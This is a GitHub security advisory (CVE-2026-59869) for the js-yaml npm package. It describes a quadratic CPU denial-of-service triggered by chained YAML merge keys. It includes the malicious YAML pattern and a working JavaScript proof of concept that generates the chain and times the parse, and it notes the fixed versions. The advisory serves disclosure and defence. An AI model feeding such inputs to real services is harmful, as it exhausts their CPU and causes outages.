# [H] js-yaml: YAML merge-key chains can force quadratic CPU consumption

## Summary
Severity: High
Advisory: GHSA-52cp-r559-cp3m
CVE: CVE-2026-59869
CWE: CWE-400, CWE-407
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-07-20
Source: https://github.com/advisories/GHSA-52cp-r559-cp3m
Type: github-advisory

## Affected
- npm: `js-yaml` — affected >=3.0.0 <3.15.0
- npm: `js-yaml` — affected >=4.0.0 <4.3.0

## Details
### Impact

js-yaml can spend quadratic CPU time parsing a document whose size grows only linearly. The issue is triggered by a chain of mappings where each mapping merges the previous one:

```yaml
a0: &a0 { k0: 0 }
a1: &a1 { <<: *a0, k1: 1 }
a2: &a2 { <<: *a1, k2: 2 }
a3: &a3 { <<: *a2, k3: 3 }
...
b: *aN
```

For each new mapping, the loader has to enumerate the keys inherited from the previous mapping. With N chained mappings, this results in roughly 1 + 2 + ... + N merged-key visits, i.e., O(N^2) work for O(N) input size.

### PoC

From N = 4000 delay become > 1s (doc size < 100K)

```js
import { performance } from 'node:perf_hooks'
import { Buffer } from 'node:buffer'
import { load, YAML11_SCHEMA } from 'js-yaml'

const n = Number(process.argv[2] || 4000)

function makeMergeChain (count) {
  const lines = ['a0: &a0 { k0: 0 }']

  for (let i = 1; i < count; i++) {
    lines.push(`a${i}: &a${i} { <<: *a${i - 1}, k${i}: ${i} }`)
  }

  lines.push(`b: *a${count - 1}`)
  return `${lines.join('\n')}\n`
}

const source = makeMergeChain(n)

console.log(source.split('\n').slice(0, 8).join('\n'))
console.log('...')
console.log(source.split('\n').slice(-4).join('\n'))
console.log()
console.log(`N: ${n}`)
console.log(`YAML size: ${Buffer.byteLength(source)} bytes`)

const started = performance.now()
const result = load(source, { schema: YAML11_SCHEMA })
const elapsed = performance.now() - started

console.log(`parse time: ${elapsed.toFixed(1)} ms`)
console.log(`top-level keys: ${Object.keys(result).length}`)
console.log(`b keys: ${Object.keys(result.b).length}`)
```

### Patches

Fix released. The most robust protection is to limit the total number of merged keys per parse call. This should close all past and future edge cases with merge. The default 10K-key limit should be okay in most cases.

## References
- https://github.com/nodeca/js-yaml/security/advisories/GHSA-52cp-r559-cp3m
- https://nvd.nist.gov/vuln/detail/CVE-2026-59869
- https://github.com/nodeca/js-yaml/commit/24f13e79ee1343a7e30bd6f6c9d9cdbf0ac9b2b7
- https://github.com/nodeca/js-yaml/commit/59423c6f8cdc78742ac00e25a4dd39ef16b702e4
- https://github.com/nodeca/js-yaml
- https://github.com/nodeca/js-yaml/releases/tag/3.15.0
- https://github.com/nodeca/js-yaml/releases/tag/4.3.0
